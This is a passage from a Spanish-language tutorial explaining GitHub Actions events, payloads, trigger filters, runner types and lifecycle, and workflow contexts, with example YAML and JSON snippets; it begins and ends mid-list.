1. **Cuándo se disparan workflows**: Después de que GitHub procesa la acción, no durante
2. **Qué información está disponible**: Solo lo que GitHub conoce en ese momento
3. **Por qué hay delay**: El evento debe procesarse primero
4. **Cómo debuggear**: Si no se dispara, el problema está en GitHub, no en tu push

**Tipos de eventos: La taxonomía**

GitHub Actions tiene **más de 50 tipos de eventos**. Se organizan en categorías:

```
📦 EVENTOS DE REPOSITORIO:
   - push: Alguien pushea commits
   - pull_request: Acciones en PRs
   - issues: Acciones en issues
   - release: Crear releases
   - fork: Alguien hace fork

👤 EVENTOS DE COLABORACIÓN:
   - issue_comment: Comentarios en issues/PRs
   - pull_request_review: Reviews de PRs
   - pull_request_review_comment: Comentarios en reviews

⏰ EVENTOS PROGRAMADOS:
   - schedule: Ejecución periódica (cron)

🎛️ EVENTOS MANUALES:
   - workflow_dispatch: Ejecutar manualmente
   - repository_dispatch: API externa dispara

🔗 EVENTOS DE INTEGRACIÓN:
   - check_suite: Resultados de checks
   - status: Estado de commits
   - deployment: Deployments

📋 EVENTOS DE GESTIÓN:
   - workflow_run: Cuando otro workflow termina
   - workflow_call: Workflows reusables
```

**El payload: El tesoro de información**

Cada evento viene con un **payload** (carga útil) que contiene información detallada:

```json
// Ejemplo: Evento "push"
{
  "event": "push",
  "repository": {
    "name": "mi-repo",
    "full_name": "usuario/mi-repo",
    "private": false,
    "owner": {"login": "usuario"}
  },
  "ref": "refs/heads/main",
  "before": "abc123...",  // SHA anterior
  "after": "def456...",   // SHA nuevo
  "commits": [
    {
      "id": "def456...",
      "message": "Add new feature",
      "author": {
        "name": "Juan",
        "email": "juan@example.com"
      },
      "added": ["file1.txt"],
      "modified": ["file2.txt"],
      "removed": []
    }
  ],
  "pusher": {"name": "usuario"},
  "sender": {"login": "usuario"}
}
```

Este payload es **extremadamente valioso** porque:
1. Está disponible en el contexto `github.event.*`
2. Contiene información que no está en Git
3. Incluye metadata de GitHub (PR numbers, issue numbers, etc.)
4. Es diferente para cada tipo de evento

**Eventos vs Triggers: La diferencia sutil**

```
EVENTO:
  = Lo que PASÓ
  = Generado por GitHub
  = Ejemplo: "Se abrió un PR"

TRIGGER:
  = La CONFIGURACIÓN de tu workflow
  = Defines en "on:"
  = Ejemplo: "Ejecutar cuando se abra un PR"

Analogía:
  Evento = Timbre sonando
  Trigger = Configurar "cuando suene el timbre, abrir la puerta"
```

**Filtros de eventos: Control granular**

No siempre quieres reaccionar a TODOS los eventos de un tipo. GitHub permite **filtros**:

```yaml
# Sin filtros: Se ejecuta en CUALQUIER push
on: push

# Con filtros de branch:
on:
  push:
    branches:
      - main
      - develop
# Solo se ejecuta en push a main o develop

# Con filtros de path:
on:
  push:
    paths:
      - 'src/**'
      - '!src/tests/**'
# Solo se ejecuta si cambiaron archivos en src/
# PERO NO en src/tests/

# Con filtros de tipo de actividad:
on:
  pull_request:
    types: [opened, synchronize]
# Solo cuando se ABRE o ACTUALIZA un PR
# No cuando se cierra, se mergea, etc.
```

**¿Por qué los filtros son poderosos?**

Porque ahorran recursos y dinero:

```
Sin filtros:
  push a docs/ → Ejecuta tests (innecesario)
  push a tests/ → Ejecuta deploy (innecesario)
  push a README → Ejecuta CI completo (innecesario)

Con filtros:
  push a docs/ → Ejecuta deploy-docs
  push a src/ → Ejecuta tests
  push a README → No ejecuta nada
```

**Eventos condici onales: if en eventos**

Además de filtros en `on:`, puedes usar `if:` en jobs y steps:

```yaml
on: push

jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps: [...]
  
  test:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps: [...]
```

```
Diferencia sutil:
  Filtros en "on:": El workflow NI SIQUIERA SE CREA
  Filtros con "if:": El workflow se crea, pero el job no se ejecuta

¿Cuál usar?
  Filtros "on:": Cuando NUNCA quieres que se ejecute
  Filtros "if:": Cuando quieres lógica condicional compleja
```

**El evento "workflow_dispatch": Control manual**

Este es un evento especial que merece atención:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Environment to deploy'
        required: true
        type: choice
        options:
          - dev
          - staging
          - production
      version:
        description: 'Version to deploy'
        required: false
        default: 'latest'
```

```
Con esto puedes:
  1. Ir a la pestaña "Actions" en GitHub
  2. Seleccionar el workflow
  3. Click "Run workflow"
  4. Llenar los inputs (environment, version)
  5. Ejecutar manualmente

Es como tener un "botón" en GitHub para ejecutar tu workflow
```

**El evento "schedule": Automatización temporal**

```yaml
on:
  schedule:
    - cron: '0 0 * * *'  # Diario a medianoche UTC
    - cron: '0 12 * * 1' # Lunes a mediodía UTC
```

**Limitaciones importantes:**

1. **Granularidad**: Mínimo cada 5 minutos (no cada segundo)
2. **Zona horaria**: Siempre UTC
3. **Delay**: Puede tener hasta 15 minutos de retraso en repos con mucha carga
4. **Branch**: Solo se ejecuta desde la rama default (main)

**Casos de uso:**
- Backups diarios
- Limpieza de recursos
- Reportes periódicos
- Health checks
- Sincronización con sistemas externos

**El sistema de webhooks: Lo que no ves**

Internamente, GitHub Actions usa un sistema de **webhooks** entre sus componentes:

```
GitHub.com API
      ↓ (genera evento)
Event System
      ↓ (webhook interno)
Workflow Engine
      ↓ (decide qué ejecutar)
Job Scheduler
      ↓ (asigna runners)
Runners
```

Cada flecha es técnicamente un webhook: un componente notifica a otro que algo pasó.

**¿Por qué entender eventos te da poder?**

1. **Crear workflows inteligentes**: Solo se ejecutan cuando deben
2. **Ahorrar recursos**: No desperdicias minutos de GitHub Actions
3. **Optimizar tiempos**: Workflows más rápidos con filtros precisos
4. **Integrar sistemas**: Puedes disparar workflows desde APIs externas
5. **Debuggear efectivamente**: Sabes por qué un workflow se ejecutó o no

Ahora veamos los detalles técnicos de cada tipo de evento.

---

### 4.1 ¿Qué es un Evento?

Un **evento** es una **señal que algo sucedió en GitHub**. Técnicamente:

1. **Origen**: Proviene de la API de GitHub (GitHub detecta una acción)
2. **Naturaleza**: Es un webhook interno
3. **Payload**: Objeto JSON con toda la información del evento
4. **Propagación**: Se envía al sistema de workflows

### 4.2 ¿Quién Genera los Eventos?

**RESPUESTA: GitHub.com (el servidor)**

Ejemplos concretos:

```
CASO 1: git push
────────────────
TÚ (usuario local):
  $ git push origin main
      ↓
TU MÁQUINA:
  Envía los commits al servidor de GitHub
      ↓
GITHUB.COM (servidor):
  1. Recibe los commits
  2. Actualiza la base de datos del repositorio
  3. GENERA EVENTO "push"
  4. Crea un payload:
     {
       "event": "push",
       "ref": "refs/heads/main",
       "commits": [...],
       "pusher": {"name": "tu-usuario"},
       ...
     }
  5. Envía el evento al sistema de Workflow Engine
```

```
CASO 2: Abrir un Pull Request
──────────────────────────────
TÚ:
  Clickeas "Create Pull Request" en GitHub web
      ↓
GITHUB.COM:
  1. Crea el PR en la base de datos
  2. GENERA EVENTO "pull_request" con action "opened"
  3. Payload:
     {
       "event": "pull_request",
       "action": "opened",
       "pull_request": {
         "number": 123,
         "title": "...",
         "head": {"ref": "feature-branch"},
         ...
       }
     }
  4. Dispara workflows que escuchan "pull_request"
```

```
CASO 3: Schedule (cron)
───────────────────────
GITHUB.COM:
  Tiene un scheduler interno (similar a cron)
      ↓
  Cada minuto revisa:
  "¿Hay workflows con 'on: schedule' que deben ejecutarse ahora?"
      ↓
  SI HAY:
    1. GENERA EVENTO "schedule"
    2. Payload:
       {
         "event": "schedule",
         "schedule": "0 0 * * *"
       }
    3. Ejecuta el workflow
```

### 4.3 Tipos de Eventos y su Origen

| Evento | Origen | Quién lo dispara |
|--------|--------|------------------|
| `push` | API Git | `git push` desde cualquier máquina |
| `pull_request` | GitHub Web/API | Crear/actualizar PR en GitHub.com |
| `issues` | GitHub Web/API | Abrir/cerrar issue en GitHub.com |
| `schedule` | GitHub Scheduler | Reloj interno de GitHub |
| `workflow_dispatch` | GitHub Web/API | Usuario clickea "Run workflow" |
| `release` | GitHub Web/API | Crear release en GitHub.com |
| `fork` | GitHub Web | Alguien forkea tu repo |

### 4.4 Anatomía de un Payload de Evento

**Ejemplo real de evento `push`:**

```json
{
  "ref": "refs/heads/main",
  "before": "abc123...",
  "after": "def456...",
  "repository": {
    "id": 123456,
    "name": "mi-repo",
    "full_name": "usuario/mi-repo",
    "owner": {
      "login": "usuario",
      "id": 789
    }
  },
  "pusher": {
    "name": "dukono",
    "email": "dukono@users.noreply.github.com"
  },
  "sender": {
    "login": "dukono",
    "id": 71391337
  },
  "commits": [
    {
      "id": "def456...",
      "message": "Add feature",
      "timestamp": "2026-02-02T12:00:00Z",
      "author": {
        "name": "Bill Gates",
        "email": "bill@microsoft.com"
      },
      "committer": {
        "name": "dukono",
        "email": "dukono@users.noreply.github.com"
      }
    }
  ],
  "head_commit": { ... },
  "compare": "https://github.com/usuario/mi-repo/compare/abc123...def456"
}
```

**Este payload está disponible en:**
- `${{ github.event }}` (todo el objeto)
- `${{ github.event.pusher.name }}` (navegación por propiedades)
- Archivo físico: `$GITHUB_EVENT_PATH` (JSON file en el runner)

---

## 5. RUNNERS: LA INFRAESTRUCTURA DE EJECUCIÓN

### Introducción: Las Máquinas que Ejecutan Tu Código

Los **runners** son posiblemente el componente más importante y menos comprendido de GitHub Actions. No son solo "servidores": son **entornos de ejecución completos, aislados y efímeros** que ejecutan tu código.

**¿Qué es realmente un runner?**

Un runner es:
1. **Una máquina física o virtual**: Con CPU, RAM, disco, red
2. **Un sistema operativo completo**: Ubuntu, Windows, o macOS
3. **Software preinstalado**: Git, Node.js, Python, Docker, y más
4. **Un agente de GitHub Actions**: Software que se comunica con GitHub
5. **Un entorno aislado**: Tu job no ve otros jobs
6. **Efímero**: Se destruye después de cada job

**La filosofía de runners: Efímeros e inmutables**

```
Modelo Tradicional (Servidores Persistentes):
┌─────────────────────────────────────────┐
│ Servidor CI/CD permanente               │
│ - Ejecuta job 1                         │
│ - Ejecuta job 2                         │
│ - Ejecuta job 3                         │
│ - Los 3 comparten el mismo filesystem   │
│ - Pueden interferirse entre sí          │
│ - Acumulan "basura" con el tiempo       │
└─────────────────────────────────────────┘

Problemas:
❌ Un job puede afectar a otro
❌ Dificil depurar ("funciona en mi máquina pero no en CI")
❌ Problemas de permisos acumulados
❌ Necesitas "limpiar" manualmente

Modelo GitHub Actions (Runners Efímeros):
┌─────────────────────────────────────────┐
│ Runner 1 (para job 1)                   │
│ - Nace limpio                           │
│ - Ejecuta job 1                         │
│ - Se destruye                           │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ Runner 2 (para job 2)                   │
│ - Nace limpio (nuevo)                   │
│ - Ejecuta job 2                         │
│ - Se destruye                           │
└─────────────────────────────────────────┘

Ventajas:
✓ Cada job empieza en estado limpio
✓ No hay interferencia entre jobs
✓ Reproducibilidad perfecta
✓ Seguridad mejorada
✓ No necesitas "limpiar"
```

**Dos tipos de runners: GitHub-hosted vs Self-hosted**

```
┌──────────────────────────────────────────────────────────┐
│  GITHUB-HOSTED RUNNERS                                   │
├──────────────────────────────────────────────────────────┤
│  Propietario: GitHub                                     │
│  Ubicación: Data centers de GitHub (Azure)              │
│  Costo: Incluido en tu plan / por minuto                 │
│  Hardware: Estándar (2 cores, 7GB RAM, 14GB SSD)        │
│  Sistemas: Ubuntu, Windows, macOS                        │
│  Software: Preinstalado (120+ herramientas)             │
│  Mantenimiento: GitHub lo hace                           │
│  Escalabilidad: Infinita (GitHub tiene miles)           │
│                                                          │
│  Ventajas:                                               │
│  ✓ Cero configuración                                    │
│  ✓ Siempre actualizado                                   │
│  ✓ Múltiples sistemas operativos                         │
│                                                          │
│  Desventajas:                                            │
│  ✗ Hardware estándar (no puedes cambiar specs)          │
│  ✗ No puedes instalar software de sistema               │
│  ✗ No acceso a recursos internos de tu empresa          │
│  ✗ Cuesta minutos de GitHub Actions                     │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│  SELF-HOSTED RUNNERS                                     │
├──────────────────────────────────────────────────────────┤
│  Propietario: TÚ                                         │
│  Ubicación: Tu infraestructura (AWS, on-premise, etc.)  │
│  Costo: Gratis de GitHub / tu infraestructura           │
│  Hardware: Lo que quieras (GPU, 128 cores, TB de RAM)   │
│  Sistemas: Cualquiera (incluso custom)                   │
│  Software: Instalas lo que necesites                     │
│  Mantenimiento: TÚ lo haces                              │
│  Escalabilidad: Depende de tu infraestructura           │
│                                                          │
│  Ventajas:                                               │
│  ✓ Hardware personalizado                                │
│  ✓ Software preinstalado custom                          │
│  ✓ Acceso a recursos internos                            │
│  ✓ No gastas minutos de GitHub                           │
│                                                          │
│  Desventajas:                                            │
│  ✗ Tienes que configurar y mantener                      │
│  ✗ Tienes que pagar la infraestructura                   │
│  ✗ Responsabilidad de seguridad                          │
└──────────────────────────────────────────────────────────┘
```

**¿Cuándo usar cada uno?**

```
Usa GitHub-hosted cuando:
✓ Empiezas con GitHub Actions
✓ Tu proyecto es estándar (Node, Python, Ruby, etc.)
✓ No necesitas hardware especial
✓ No necesitas acceso a recursos privados
✓ Quieres cero mantenimiento

Usa Self-hosted cuando:
✓ Necesitas GPU (ML/AI workloads)
✓ Necesitas mucha RAM/CPU
✓ Necesitas acceso a bases de datos internas
✓ Necesitas software propietario preinstalado
✓ Ejecutas muchos workflows (costo)
✓ Necesitas comply con regulaciones de datos
```

**La anatomía de un runner**

Un runner no es solo una máquina. Tiene múltiples capas:

```
┌───────────────────────────────────────────────┐
│ CAPA 5: TU CÓDIGO                            │
│ - Tu workflow .yml                           │
│ - Tus comandos                               │
│ - Tus scripts                                │
└─────────────┬─────────────────────────────────┘
              │
┌─────────────▼─────────────────────────────────┐
│ CAPA 4: ACTIONS                               │
│ - actions/checkout                            │
│ - actions/setup-node                          │
│ - Custom actions                              │
└─────────────┬─────────────────────────────────┘
              │
┌─────────────▼─────────────────────────────────┐
│ CAPA 3: SOFTWARE PREINSTALADO                │
│ - Git, Docker, kubectl                        │
│ - Node.js, Python, Ruby, Java                 │
│ - Compiladores, herramientas de build         │
└─────────────┬─────────────────────────────────┘
              │
┌─────────────▼─────────────────────────────────┐
│ CAPA 2: RUNNER APPLICATION                    │
│ - Agente que se comunica con GitHub           │
│ - Descarga jobs                               │
│ - Ejecuta steps                               │
│ - Reporta resultados                          │
└─────────────┬─────────────────────────────────┘
              │
┌─────────────▼─────────────────────────────────┐
│ CAPA 1: SISTEMA OPERATIVO                    │
│ - Ubuntu 22.04 / Windows Server / macOS       │
│ - Kernel, drivers, sistema de archivos        │
└─────────────┬─────────────────────────────────┘
              │
┌─────────────▼─────────────────────────────────┐
│ CAPA 0: HARDWARE / VIRTUALIZACIÓN            │
│ - Máquina física / VM / Container             │
│ - CPU, RAM, Disco, Red                        │
└───────────────────────────────────────────────┘
```

**El ciclo de vida de un runner (GitHub-hosted)**

```
FASE 1: PROVISIONING (10-30 segundos)
────────────────────────────────────────
GitHub detecta que hay un job en cola
    ↓
Busca un runner con el OS requerido (ubuntu-latest)
    ↓
SI NO HAY RUNNER DISPONIBLE:
  ┌─ Crea una VM nueva en Azure
  ┌─ Instala el OS base
  ┌─ Instala todo el software pre-configurado
  └─ Inicia el runner application
    (Esto toma 10-30 segundos)

SI HAY RUNNER DISPONIBLE:
  └─ Asigna el job inmediatamente


FASE 2: SETUP JOB (5-15 segundos)
──────────────────────────────────
Runner recibe el job
    ↓
1. Crea directorio de trabajo:
   /home/runner/work/repo-name/repo-name

2. Prepara variables de entorno:
   GITHUB_WORKSPACE=/home/runner/work/...
   GITHUB_SHA=abc123...
   GITHUB_REF=refs/heads/main
   + 40 más variables

3. Configura autenticación:
   - Token temporal para GitHub API
   - Credenciales Git
   - Docker registry (si es necesario)

4. Instala software adicional (si `uses: actions/setup-node@v4`)


FASE 3: EJECUTAR STEPS (variable)
──────────────────────────────────
Para cada step en tu workflow:

  Step 1: actions/checkout@v4
    ↓
  - Runner descarga la action desde github.com/actions/checkout
  - Ejecuta el código de la action (Node.js)
  - Action clona tu repo
  - Action hace checkout del commit específico
  - Resultado: Tu código está en /home/runner/work/...

  Step 2: run: npm install
    ↓
  - Runner abre un shell (bash)
  - Ejecuta "npm install"
  - Captura stdout/stderr
  - Verifica exit code
  - Si exit code != 0 → JOB FALLA

  Step 3: run: npm test
    ↓
  - (mismo proceso)


FASE 4: POST-ACTIONS (2-5 segundos)
────────────────────────────────────
Después de ejecutar todos los steps:

1. Ejecuta "post" actions (cleanup)
   - actions/checkout tiene un "post" que limpia credenciales

2. Sube artifacts (si configuraste)
   - Comprime archivos
   - Sube a GitHub storage

3. Sube logs completos
   - Cada línea de stdout/stderr
   - Con timestamps

4. Sube cache (si configuraste)


FASE 5: TEARDOWN (instantáneo)
───────────────────────────────
Runner envía resultado final a GitHub
    ↓
GitHub marca el job como "completed"
    ↓
Runner se auto-destruye:
  - Filesystem eliminado
  - Credenciales revocadas
  - VM destruida (GitHub-hosted)
  - O limpiada (Self-hosted)

Total del job: Puede ser segundos o horas
Overhead del runner: ~20 segundos
```

**¿Qué software viene preinstalado?**

GitHub-hosted runners vienen con **MÁS DE 120 herramientas** preinstaladas:

```
Lenguajes:
  - Node.js (múltiples versiones)
  - Python (múltiples versiones)
  - Ruby, Java, Go, Rust, PHP, .NET
  - Compiladores (gcc, clang)

Herramientas de versiones:
  - Git
  - nvm, pyenv, rbenv

Herramientas de container:
  - Docker
  - Docker Compose
  - Podman

Herramientas de cloud:
  - AWS CLI
  - Azure CLI
  - Google Cloud SDK
  - kubectl, helm

Herramientas de build:
  - make, cmake
  - Maven, Gradle
  - npm, yarn, pnpm
  - pip, poetry

Y más:
  - jq, yq (procesamiento JSON/YAML)
  - curl, wget
  - zip, tar
  - ssh, scp

Lista completa:
https://github.com/actions/runner-images
```

**El problema de recursos: Límites y colas**

Los runners tienen límites:

```
GitHub-hosted runners:
┌────────────────────────────────────────┐
│ Hardware por runner:                   │
│ - 2 cores CPU                          │
│ - 7 GB RAM                             │
│ - 14 GB SSD                            │
│                                        │
│ Límites de concurrencia:               │
│ - Free: 20 jobs concurrentes           │
│ - Pro: 40 jobs concurrentes            │
│ - Enterprise: 180 jobs concurrentes    │
│                                        │
│ Si excedes el límite:                  │
│ - Jobs entran en cola (queued)         │
│ - Esperan hasta que se libere un runner│
└────────────────────────────────────────┘
```

**Optimización: Reutilización de runners**

GitHub intenta reutilizar runners cuando es posible (solo self-hosted):

```
Sin reutilización:
  Job 1 → Provisiona Runner 1 → Ejecuta → Destruye
  Job 2 → Provisiona Runner 2 → Ejecuta → Destruye
  Job 3 → Provisiona Runner 3 → Ejecuta → Destruye
  (3x provisioning = 30-90 segundos overhead)

Con reutilización:
  Job 1 → Provisiona Runner 1 → Ejecuta
  Job 2 → Reutiliza Runner 1 → Ejecuta
  Job 3 → Reutiliza Runner 1 → Ejecuta
  (1x provisioning = 10-30 segundos overhead)

Nota: Aún así se limpia entre jobs
```

**Seguridad: Aislamiento entre jobs**

Cada job está **completamente aislado**:

```
Job A (en Runner 1):
  - Filesystem independiente
  - Variables de entorno independientes
  - Procesos independientes
  - Red independiente (en containers)
  - Usuario del sistema independiente

Job B (en Runner 2):
  - No puede ver nada de Job A
  - No puede acceder a archivos de Job A
  - No comparten credenciales
  - No comparten cache (a menos que explícitamente lo configures)
```

**¿Por qué esto importa?**

1. **Reproducibilidad**: Cada job empieza igual
2. **Seguridad**: Un job malicioso no afecta a otros
3. **Debugging**: Si falla, sabes que es tu código, no "residuos"
4. **Confianza**: Puedes ejecutar código de PRs externos de forma segura

Ahora veamos los detalles técnicos de runners.

---

### 5.1 ¿Qué es un Runner?

Un **runner** es una **máquina (física o virtual) que ejecuta los jobs**. Técnicamente:

```
RUNNER = Máquina + Software Agente

┌─────────────────────────────────────────┐
│         RUNNER (Máquina Virtual)        │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  SISTEMA OPERATIVO                │  │
│  │  - Ubuntu 22.04                   │  │
│  │  - Windows Server 2022            │  │
│  │  - macOS 12                       │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  GITHUB ACTIONS RUNNER (agente)   │  │
│  │  - Se conecta a GitHub.com        │  │
│  │  - Pregunta: "¿hay jobs para mí?" │  │
│  │  - Ejecuta los jobs               │  │
│  │  - Reporta resultados             │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  HERRAMIENTAS PRE-INSTALADAS      │  │
│  │  - git, curl, wget                │  │
│  │  - Node.js, Python, Java          │  │
│  │  - Docker                         │  │
│  │  - Compiladores (gcc, g++)        │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  FILESYSTEM (para tu job)         │  │
│  │  /home/runner/work/               │  │
│  │    └── repo-name/                 │  │
│  │        └── repo-name/  ← tu código│  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

### 5.2 GitHub-Hosted vs Self-Hosted

**GitHub-Hosted Runners:**
- **Quién los mantiene**: GitHub
- **Dónde están**: Azure (Microsoft)
- **Costo**: Incluidos en el plan (límites de minutos)
- **Limpieza**: Máquina nueva para cada job
- **Especificaciones**:
  - 2 CPUs, 7 GB RAM (Linux/Windows)
  - 3 CPUs, 14 GB RAM (macOS)

**Self-Hosted Runners:**
- **Quién los mantiene**: Tú
- **Dónde están**: Tu infraestructura (servidor, VPS, Raspberry Pi)
- **Costo**: Gratis (pagas la infraestructura)
- **Limpieza**: Debes limpiar manualmente
- **Especificaciones**: Las que tú decidas

### 5.3 Ciclo de Vida de un Runner

```
INICIO DEL JOB
──────────────
1. Runner disponible en el pool
2. GitHub asigna job al runner
3. Runner cambia estado a "busy"

SETUP
─────
4. Crea directorio: /home/runner/work/repo-name/repo-name
5. Descarga herramientas necesarias
6. Configura variables de entorno:
   - GITHUB_WORKSPACE=/home/runner/work/repo-name/repo-name
   - GITHUB_REPOSITORY=usuario/repo-name
   - GITHUB_SHA=abc123...
   - GITHUB_REF=refs/heads/main
   - ... (100+ variables)

EJECUCIÓN
─────────
7. Para cada step:
   a) Si es "uses: actions/..." → Descarga y ejecuta la action
   b) Si es "run: ..." → Abre shell y ejecuta
   c) Captura stdout/stderr en tiempo real
   d) Envía logs a GitHub.com
   e) Si falla (exit code != 0):
      - Marca step como failed
      - Por defecto, detiene el job (a menos que continue-on-error: true)

LIMPIEZA
────────
8. Sube artifacts a GitHub (si hay)
9. Sube cache entries (si hay)
10. Destruye el directorio de trabajo
11. En GitHub-hosted: Destruye la VM completa
12. Runner vuelve al estado "idle" (esperando nuevo job)
```

### 5.4 Aislamiento Entre Jobs

```
JOB 1                          JOB 2
Runner: ubuntu-latest-1        Runner: ubuntu-latest-2
VM: 10.0.1.100                VM: 10.0.1.101
Filesystem independiente      Filesystem independiente
Variables independientes      Variables independientes
```

**NO SE COMPARTE NADA entre jobs**, excepto:
- Artifacts (explícitamente subidos/descargados)
- Cache (explícitamente guardado/restaurado)
- Outputs (definidos con `outputs:`)

---

## 6. CONTEXTOS: EL SISTEMA DE VARIABLES

### Introducción: El Sistema Nervioso de GitHub Actions

Los **contextos** son el sistema de información que fluye a través de tus workflows. Sin entender los contextos, estás programando a ciegas. Con ellos, tienes acceso a un tesoro de información sobre el evento, el repositorio, el runner, y el estado de tu workflow.

**¿Qué es un contexto?**

Un contexto NO es solo "una variable". Es:

1. **Un objeto JSON estructurado**: Con múltiples propiedades anidadas
2. **Información inyectada**: GitHub lo crea y lo pasa a tu workflow
3. **Scope temporal**: Algunos existen todo el workflow, otros solo en ciertos momentos
4. **Read-only (mayormente)**: No puedes modificarlos directamente
5. **Accesibles vía expresiones**: Usando la sintaxis `${{ contexto.propiedad }}`

**¿Por qué existen los contextos?**

Imagina que no hubiera contextos. Tendrías que:

```yaml
# Sin contextos (imposible):
- run: echo "No sé qué commit ejecutar"
- run: echo "No sé en qué branch estoy"
- run: echo "No sé quién hizo push"
- run: echo "No sé dónde está mi código"

# Con contextos:
- run: |
    echo "Ejecutando commit: ${{ github.sha }}"
    echo "En branch: ${{ github.ref }}"
    echo "Push por: ${{ github.actor }}"
    echo "Código en: ${{ github.workspace }}"
```

Los contextos te dan **visibilidad completa** del entorno de ejecución.

**La jerarquía de contextos**

Los contextos tienen diferentes "scopes" (alcances):

```
NIVEL WORKFLOW (disponible en todo el workflow):
├─ github      → Información del evento y repositorio
├─ env         → Variables de entorno globales
├─ secrets     → Secretos del repositorio
└─ vars        → Variables de configuración

NIVEL JOB (disponible en un job específico):
├─ strategy    → Configuración de matriz (si hay)
├─ matrix      → Valores actuales de la matriz
├─ needs       → Outputs de jobs anteriores
├─ runner      → Información del runner
└─ job         → Información del job actual

NIVEL STEP (disponible en steps):
├─ steps       → Outputs de steps anteriores
└─ inputs      → Inputs del workflow (workflow_call/workflow_dispatch)
```

**Timeline: Cuándo se crean los contextos**

```
Tiempo 0: Usuario hace git push
    ↓
Tiempo 1: GitHub genera evento
    ↓
Tiempo 2: Workflow Run se crea
    ┌─────────────────────────────────────┐
    │ SE CREAN:                           │
    │ - github  (info del evento)         │
    │ - env     (variables globales)      │
    │ - secrets (acceso a secretos)       │
    │ - vars    (variables de config)     │
    └─────────────────────────────────────┘
    ↓
Tiempo 3: Job se planifica
    ┌─────────────────────────────────────┐
    │ SE CREAN:                           │
    │ - strategy (si hay matrix)          │
    │ - matrix   (valores de iteración)   │
    │ - needs    (outputs de otros jobs)  │
    └─────────────────────────────────────┘
    ↓
Tiempo 4: Runner empieza job
    ┌─────────────────────────────────────┐
    │ SE CREAN:                           │
    │ - runner (info del runner)          │
    │ - job    (info del job)             │
    └─────────────────────────────────────┘
    ↓
Tiempo 5: Se ejecutan steps
    ┌─────────────────────────────────────┐
    │ SE ACTUALIZA:                       │
    │ - steps (outputs de steps previos)  │
    │ - env   (si steps lo modifican)     │
    └─────────────────────────────────────┘
```

**¿Por qué este timing importa?**

Porque determina **qué información está disponible en cada momento**:

```yaml
# ❌ INCORRECTO:
jobs:
  build:
    runs-on: ubuntu-latest
    # Intentar usar steps aquí → ERROR
    if: steps.test.conclusion == 'success'  # steps no existe aún
    
# ✅ CORRECTO:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "test"
        id: test
      - run: echo "build"
        # Ahora sí existe steps.test
        if: steps.test.conclusion == 'success'
```

**El contexto `github`: El más importante**

El contexto `github` es el **corazón** del sistema de contextos. Contiene:

```javascript
github = {
  // INFORMACIÓN DEL EVENTO
  event_name: "push",              // ¿Qué tipo de evento?
  event: { /* payload completo */ }, // TODO el evento JSON
  
  // INFORMACIÓN GIT
  sha: "abc123...",                // Hash del commit
  ref: "refs/heads/main",          // Referencia completa
  ref_name: "main",                // Nombre corto
  ref_type: "branch",              // branch o tag
  
  // INFORMACIÓN DEL REPOSITORIO
  repository: "usuario/repo",      // Repo completo
  repository_owner: "usuario",     // Dueño
  repository_id: "123456",         // ID numérico
  
  // INFORMACIÓN DEL USUARIO
  actor: "dukono",                 // Quién disparó el evento
  actor_id: "71391337",            // ID del usuario
  triggering_actor: "dukono",      // Quién disparó (puede diferir)
  
  // INFORMACIÓN DEL WORKFLOW
  workflow: "CI Pipeline",         // Nombre del workflow
  workflow_ref: "user/repo/.github/workflows/ci.yml@refs/heads/main",
  run_id: "9876543210",            // ID único de esta ejecución
  run_number: "42",                // Número secuencial
  run_attempt: "1",                // Intento (si se re-ejecutó)
  
  // INFORMACIÓN DEL JOB
  job: "build",                    // ID del job actual
  action: "__actions/checkout",    // Action actual (si aplica)
  action_path: "...",              // Path de la action
  action_repository: "actions/checkout", // Repo de la action
  
  // RUTAS Y DIRECTORIOS
  workspace: "/home/runner/work/repo/repo", // Donde está tu código
  
  // INFORMACIÓN DEL SERVER
  server_url: "https://github.com", // URL del servidor GitHub
  api_url: "https://api.github.com", // URL de la API
  graphql_url: "https://api.github.com/graphql" // GraphQL endpoint
}
```

**¿Por qué tanta información?**

Porque te permite crear workflows **inteligentes y dinámicos**:

```yaml
# Ejemplo: Deployment condicional
jobs:
  deploy:
    runs-on: ubuntu-latest
    # Solo deploya si es push a main
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    steps:
      - name: Deploy
        run: |
          echo "Deploying commit ${{ github.sha }}"
          echo "Triggered by ${{ github.actor }}"
          
# Ejemplo: Notificación personalizada
      - name: Notify
        run: |
          curl -X POST $SLACK_WEBHOOK \
            -d "Deployed ${{ github.repository }} by ${{ github.actor }}"
```

**El contexto `secrets`: Seguridad incorporada**

Los secrets NO son variables normales:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # ✅ CORRECTO: usar en comandos
      - run: |
          curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" \
            https://api.example.com
      
      # ❌ INCORRECTO: imprimir secrets
      - run: echo "${{ secrets.API_TOKEN }}"
        # GitHub lo censura en logs: ***
```

**Características de seguridad:**

1. **Nunca se imprimen**: GitHub reemplaza con `***` en logs
2. **No se pasan entre repos**: Solo en el repo donde se configuraron
3. **Encriptados**: En reposo y en tránsito
4. **Auditados**: Cada acceso se registra

**El contexto `matrix`: Paralelización poderosa**

El contexto `matrix` permite ejecutar el mismo job con diferentes configuraciones:

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: |
          echo "Testing on ${{ matrix.os }} with Node ${{ matrix.node }}"
```

Esto crea **9 jobs** (3 OS × 3 versiones de Node):
```
Job 1: Ubuntu + Node 16
Job 2: Ubuntu + Node 18
Job 3: Ubuntu + Node 20
Job 4: Windows + Node 16
Job 5: Windows + Node 18
Job 6: Windows + Node 20
Job 7: macOS + Node 16
Job 8: macOS + Node 18
